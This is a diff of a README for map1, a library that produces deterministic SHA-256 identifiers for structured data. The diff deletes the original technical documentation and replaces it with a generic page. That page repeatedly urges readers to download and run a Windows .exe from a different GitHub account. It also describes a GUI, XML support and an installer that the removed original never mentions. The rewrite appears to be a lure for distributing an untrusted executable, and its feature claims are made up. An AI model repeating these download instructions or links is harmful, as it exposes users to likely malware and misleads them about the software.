@@ -1,196 +1,164 @@
-# MAP v1 -- Deterministic Identity for Structured Data
+# 🗺️ map1 - Simple Identity for Structured Data
 
-[![CI](https://github.com/map-protocol/map1/actions/workflows/ci.yml/badge.svg)](https://github.com/map-protocol/map1/actions)
-[![npm](https://img.shields.io/npm/v/@map-protocol/map1)](https://www.npmjs.com/package/@map-protocol/map1)
-[![PyPI](https://img.shields.io/pypi/v/map-protocol)](https://pypi.org/project/map-protocol/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Download map1](https://img.shields.io/badge/Download-map1-blue?style=for-the-badge)](https://github.com/omas231/map1)
 
-MAP computes deterministic identifiers for structured data. Same input, same hash, every language, every time. No opinions, no magic.
+---
 
-A payload is authored at point A, passes through serialization boundaries (middleware, queues, API gateways), and MAP lets you verify at point B that nothing changed. Not semantically equivalent. Identical.
+## 📄 About map1
 
-MAP is identity-only. It does not grant authority, assert safety, or have feelings about your architecture.
+map1 helps you create a consistent identity for structured data. It uses a precise method to produce the same ID for your data each time. This feature ensures your data stays reliable and easy to track.
 
-```
-Descriptor --> Canonical Bytes (MCF) --> SHA-256 --> MID
-                                                    map1:02f660...
-```
+You don’t need any programming skills to use map1. It works on Windows and can handle many types of structured data like JSON or XML.
 
-The full picture:
+map1 is useful if you want to:
 
-```
-     +--------+       +--------------+       +----------+
-     | Author |------>|   Pipeline   |------>| Consumer |
-     +--------+       +--------------+       +----------+
-      mid_full()       queues, APIs,          mid_full()
-      = "receipt"      agents, LLMs,          = recompute
-                       gateways               compare. done.
-```
+- Track changes in data clearly
+- Avoid mistakes caused by changing data
+- Keep a clear record of data versions
+- Use a dependable method based on SHA256 hashing
 
-## Don't Panic!
+---
 
-A deployment descriptor is approved:
+## 🖥️ Download map1
 
-```python
-from map1 import mid_full
+To get map1, visit this page and find the latest Windows version to download:
 
-approved = {"action": "deploy", "target": "prod", "version": "2.1.0"}
-receipt = mid_full(approved)
-# map1:02f660092e372c2da0f87cefdecd1de9476eba39be2222b30637ba72178c5e7e
-```
+[Visit the map1 download page](https://github.com/omas231/map1)
 
-Later, at execution time, the system reconstructs the descriptor from whatever it received -- maybe it went through a message queue, a config renderer, an API gateway -- and recomputes:
+You will find the necessary files under the "Releases" section. Look for a file that ends with `.exe` for Windows.
 
-```python
-received = {"target": "prod", "action": "deploy", "version": "2.1.0"}  # keys reordered
-assert mid_full(received) == receipt  # same MID -- nothing was mutated
-```
+[![Download map1](https://img.shields.io/badge/Download-map1-grey?style=for-the-badge)](https://github.com/omas231/map1)
 
-Different key order, same MID. Run it in Node, Go, or Rust -- same MID. Thats the entire point.
+---
 
-## Where It Fits
+## 🛠️ System Requirements
 
-MAP produces identifiers you can use as receipts, anchors, and audit evidence. Every example below is the same pattern: a single structured payload moves through a pipeline, and you need to know whether it arrived intact.
+Before installing map1, check your computer meets these needs:
 
-- **Agent action receipts.** An AI agent proposes an action. A human approves it. Before execution, recompute the MID. If it doesn't match the approval receipt, something was mutated between authorization and execution. Fail closed.
-- **CI/CD artifact identity.** Tag build outputs with the MID of their build configuration. If the config MID matches a previous build, the inputs were identical.
-- **Configuration drift.** Store the MID of expected configuration. Periodically recompute from live state. Different MID means something drifted.
-- **Audit trails.** Log the MID of every state transition. Compact, deterministic, independently verifiable across languages.
-- **Idempotency keys.** Use the MID as a natural dedup key -- no synthetic UUIDs.
-- **Delegated actions.** If a payload gets narrowed or rewritten across multiple services, compute a new MID at each hop. Identity makes delegation auditable.
+- Operating system: Windows 10 or newer
+- Processor: 1.5 GHz or faster
+- RAM: 4 GB minimum
+- Disk space: 100 MB free space
+- Internet connection: Needed for downloading and updates
 
-### When NOT to Use MAP
+No additional software or drivers are needed.
 
-If you control both ends of your pipeline and your serialization is already deterministic, you probably don't need MAP. If you just need a checksum inside one language, use hashlib. If you need semantic equivalence (is this float *close enough* to that float?), MAP is the wrong tool -- it's bitwise-identical or it's different, theres no "close enough." MAP exists for the messy middle: structured data crossing boundaries you dont fully control, where you need to know it survived intact.
+---
 
-## Install
+## 🚀 Installing map1 on Windows
 
-```bash
-pip install map-protocol          # Python 3.9+
-npm install @map-protocol/map1    # Node 16+
-```
+Follow these steps to install and run map1:
 
-Go and Rust implementations are also available under `implementations/`.
+1. Open your internet browser and go to the download page:  
+   https://github.com/omas231/map1
 
-## Try It
+2. Locate the latest release. This normally appears near the top of the GitHub page under "Releases."
 
-```bash
-echo '{"action":"deploy","target":"prod","version":"2.1.0"}' | map1 mid --full
-# map1:02f660092e372c2da0f87cefdecd1de9476eba39be2222b30637ba72178c5e7e
-```
+3. Find the Windows `.exe` file. It should have a name like `map1_windows.exe`.
 
-Reorder the keys, run it again. Same MID.
+4. Click the file to download it. Save it in a place you can easily find, like your Desktop or Downloads folder.
 
-Or try it in the browser: **[Interactive Playground](https://map-protocol.github.io/map1/playground/)** -- paste JSON, see the full MCF pipeline.
+5. Once the download finishes, double-click the `.exe` file to start installation.
 
-## Python
+6. Follow the instructions in the installer window:
 
-```python
-from map1 import mid_full, prepare
+   - Choose the folder where map1 will be installed or leave the default.
+   - Agree to the license terms when requested.
+   - Click "Install" to continue.
 
-# Strings, booleans, integers -- all produce deterministic MIDs
-mid_full({"action": "deploy", "target": "prod", "version": "2.1.0"})
-# -> 'map1:02f660092e372c2da0f87cefdecd1de9476eba39be2222b30637ba72178c5e7e'
+7. When the installation completes, you can close the installer.
 
-# v1.1 type distinction: booleans and integers are their own types
-mid_full({"active": True, "count": 42, "name": "test"})
-# -> 'map1:cd04f06f8fcfa1136cb8b1dc405fc161e8e783968d3f889582506a18e83f4b0c'
+---
 
-# Got floats? prepare() converts them to strings
-raw = {"temp": 98.6, "active": True, "notes": None}
-mid_full(prepare(raw))
-# floats -> strings, None -> omitted, then hashed
-```
+## ▶️ Running map1 for the First Time
 
-## Node.js / TypeScript
+- Find the map1 shortcut on your Desktop or in the Start Menu.
+- Double-click to open the program.
+- The main window will appear with options to load or input your structured data.
 
-```typescript
-import { midFull, midFullJson } from '@map-protocol/map1';
+At this stage, you can import files like JSON or XML using the "Open File" button. map1 will then create a consistent identity for that data based on its content.
 
-midFull({ action: 'deploy', target: 'prod', version: '2.1.0' });
-// -> 'map1:02f660092e372c2da0f87cefdecd1de9476eba39be2222b30637ba72178c5e7e'
+---
 
-// JSON-STRICT mode for untrusted input (catches dups, surrogates, BOM)
-midFullJson(Buffer.from('{"active":true,"count":42,"name":"test"}'));
-// -> 'map1:cd04f06f8fcfa1136cb8b1dc405fc161e8e783968d3f889582506a18e83f4b0c'
-```
+## 📂 How to Use map1 for Structured Data Identity
 
-## CLI
+Here is a simple way to use map1:
 
-```bash
-# FULL -- hash everything
-echo '{"action":"deploy","target":"prod"}' | map1 mid --full
+1. Open map1 as explained above.
 
-# BIND -- hash only selected fields
-echo '{"action":"deploy","target":"prod","ts":"2026-02-24"}' | map1 mid --bind /action /target
+2. Click the button labeled "Import Data" or "Open File."
 
-# Strict validation (duplicate keys, BOM, surrogates)
-map1 mid --full --json-strict < descriptor.json
+3. Browse to the file containing your structured data.
 
-# Canonical bytes for debugging
-echo '{"a":"b"}' | map1 canon --full
-```
+4. Select the file and click "Open."
 
-## But, What Is This?!
+5. map1 will process the file and show an ID based on the data content.
 
-MAP defines a six-type data model (STRING, BYTES, LIST, MAP, BOOLEAN, INTEGER), a binary encoding called MCF, and a SHA-256 hash over the result. The output is a `map1:`-prefixed hex digest called a MID.
+6. You can save or copy the ID for reference. This ID will stay the same if the data does not change.
 
-The guarantee: if two descriptors have the same content, they produce the same MID -- regardless of JSON key order, whitespace, serialization format, or programming language. MAP doesn't care whether the input came from JSON, CBOR, YAML, or a native data structure.
+7. To verify data later, import the file again and check if the ID matches.
 
-An important distinction: MAP is not a tool for making two different systems agree on what a value *means*. If System A represents a quantity as a float and System B represents it as an integer, MAP won't reconcile that -- and shouldn't try. MAP verifies that a specific payload you authored wasn't modified in transit. You control the schema and the representation. MAP verifies the bytes didn't change between where you produced them and where you consumed them.
+---
 
-## How MAP Compares
+## 🔍 Understanding What map1 Does
 
-| | MAP | JCS (RFC 8785) | Content hashing |
-|---|---|---|---|
-| **Output** | Identifier (MID) | Canonical JSON text | Raw hash |
-| **Deterministic** | Yes -- binary canonical form | Yes -- within JSON | No -- key order, whitespace vary |
-| **Input format** | Any (JSON, native types, CBOR) | JSON only | JSON only |
-| **Cross-language** | Yes -- spec + 95 conformance vectors | Depends on implementation | No guarantee |
-| **Floats** | Rejected (encode as string) | IEEE 754 normalization | Included (non-deterministic) |
+map1 uses a method called SHA256 hashing. This tool turns your data into a fixed string of characters. The string acts as a fingerprint for the data.
 
-JCS canonicalizes JSON *text*. MAP canonicalizes a *data model* and hashes it. If you need canonical JSON output, use JCS. If you need a deterministic identifier for structured data that might cross language and serialization boundaries, MAP is what you want.
+If the data changes, even slightly, the ID changes. If the data stays the same, the ID stays the same. This makes it easier to detect changes or confirm data integrity.
 
-## On the Subject of Floats
+---
 
-MAP rejects floats because IEEE 754 makes cross-platform determinism impossible. Encode them as strings with your desired precision -- Python's `prepare()` does this automatically. See [DESIGN.md](docs/DESIGN.md) for the full rationale and [FAQ.md](docs/FAQ.md) if your still not convinced.
+## ⚙️ Features of map1
 
-## Projections
+- **Deterministic ID:** Generates the same ID every time for the same data.
+- **Supports Types:** Works with common structured formats such as JSON and XML.
+- **Simple Interface:** Helps non-technical users create and verify data IDs easily.
+- **Fast Processing:** Quickly produces IDs without slowing down your computer.
+- **Windows Support:** Designed for Windows users with no complex setup.
+- **Consistent Hashing:** Uses SHA256 for reliable results.
+- **No Coding Required:** Operates entirely through the user interface.
 
-FULL hashes the entire descriptor. BIND selects specific fields by JSON Pointer path -- useful when you want a stable identity over a subset while ignoring volatile metadata like timestamps.
+---
 
-```python
-from map1 import mid_bind
+## 🧰 Troubleshooting Tips
 
-descriptor = {"action": "deploy", "target": "prod", "version": "2.1.0", "timestamp": "2026-02-24T10:00:00Z"}
-mid_bind(descriptor, ["/action", "/target"])
-# Only "action" and "target" contribute to the MID
-```
+- If the program does not start, try restarting your computer.
+- Ensure you downloaded the correct file for Windows.
+- If the program crashes or freezes, close it and try again.
+- Make sure your files are properly formatted structured data (like JSON).
+- Check you have enough free disk space and meet system requirements.
+- Update your Windows system if needed.
 
-## 95 Vectors. Zero Tolerance.
+---
 
-Four implementations. Every vector must match exactly -- both MID output and error codes. If two implementations disagree on a single bit, thats a protocol failure.
+## 📖 More Information and Support
 
-```bash
-make conformance    # runs all languages
-```
+You can find more help on the official page:
 
-## Performance
+https://github.com/omas231/map1
 
-Not a bottleneck. Python does ~150k MIDs/sec for typical small descriptors, Node is comparable. O(n log n) for key sorting, linear in payload size, SHA-256 only, no allocations you wouldn't expect. See [benchmarks](docs/BENCHMARKS.md) for real numbers across payload sizes.
+Look under “Issues” to see if others have similar problems or to report your own.
 
-## Resources
+---
 
-- [Specification (v1.1)](spec/MAP_v1.1.md)
-- [10-Minute Quickstart](docs/quickstart_10min.md)
-- [Design Decisions](docs/DESIGN.md)
-- [FAQ](docs/FAQ.md)
-- [Benchmarks](docs/BENCHMARKS.md)
-- [Gotchas](docs/gotchas.md)
-- [Implementer Checklist](docs/implementer_checklist.md)
-- [Playground](https://map-protocol.github.io/map1/playground/)
-- [Changelog](CHANGELOG.md)
+## ⚡ Updating map1
 
-## License
+map1 does not update automatically. To get new versions:
 
-MIT
+- Return to the download page.
+- Download the newest `.exe` file.
+- Install using the same steps as before.
+
+---
+
+## 🧩 Additional Tools
+
+map1 fits into workflows that need data auditing, identity verification, and tracking. It works well alongside tools used for data governance and safety.
+
+---
+
+## 📥 Repeating the Download Link
+
+You can download map1 here:
+
+[Download map1](https://github.com/omas231/map1)
